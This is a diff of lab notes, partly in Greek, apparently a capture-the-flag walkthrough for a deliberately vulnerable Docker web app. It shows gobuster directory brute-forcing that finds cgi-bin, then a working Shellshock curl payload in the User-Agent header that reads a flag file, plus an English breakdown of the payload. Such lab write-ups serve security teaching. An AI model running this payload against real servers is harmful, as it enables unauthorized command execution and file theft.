@@ -3,15 +3,30 @@
 sudo docker build --tag=vuln_web_app .
 sudo docker run -p 5052:80 --rm --name=vuln_web_app  vuln_web_app
 
-sudo apt install gobuster : Πρόγραμμα για bruteforce directory
 
-wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/small.txt : Wordlist για το bruteforce
+gobuster -u http://192.168.x.x:5052/ -w /home/wordlist/wordlist.txt- Βρίσκουμε directory με το όνομα cgi-bin
 
-gobuster -u http://localhost:5052/ -w /home/marios/Desktop/small.txt - Βρίσκουμε directory με το όνομα cgi-bin
-
-gobuster -u http://localhost:5052/cgi-bin -w /home/marios/Desktop/small.txt - Ξανατρέχουμε για έξτρα αρχεία μέσα στο νέο directory.
+gobuster -u http://192.168.x.x:5052/cgi-bin/ -w /home/wordlist/wordlist.txt - Ξανατρέχουμε για έξτρα αρχεία μέσα στο νέο directory.
 Βλέπουμε το secret
 
 Είμαστε σίγουροι ότι πρόκειται για shellshock vulnerability.
-curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /home/secret/flag.txt" localhost:5052/cgi-bin/secret
+curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /home/secret/flag.txt" 192.168.x.x:5052/cgi-bin/secret
+
+
+
+Let's break down the command:
+
+    curl is a command-line tool for transferring data with URLs. In this case, it's being used to make an HTTP request to the specified URL.
+
+    -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /home/secret/flag.txt" is an option for curl. It sets the User-Agent header of the HTTP request to exploit the Shellshock vulnerability. The User-Agent header is typically used to identify the client making the request. In this case, it's being used to inject a malicious payload into the request.
+
+        () { :; }; is the actual payload that triggers the Shellshock vulnerability. It defines a function but doesn't give it a name (hence :;). This is where the Shellshock vulnerability occurs, as the server interprets this part as a command to execute.
+
+        echo "Content-type: text/plain"; is part of the payload and is used to set the HTTP response's content type to plain text.
+
+        echo; is another part of the payload, and it adds a blank line to the HTTP response.
+
+        /bin/cat /home/secret/flag.txt is the malicious command that the attacker wants to execute. It attempts to read the contents of the /home/secret/flag.txt file on the target server. This is the actual command that the attacker wants to run on the server.
+
+    localhost:5052/cgi-bin/secret is the URL where the attacker is sending this request. The vulnerability is expected to exist in the CGI script located at this URL.
 
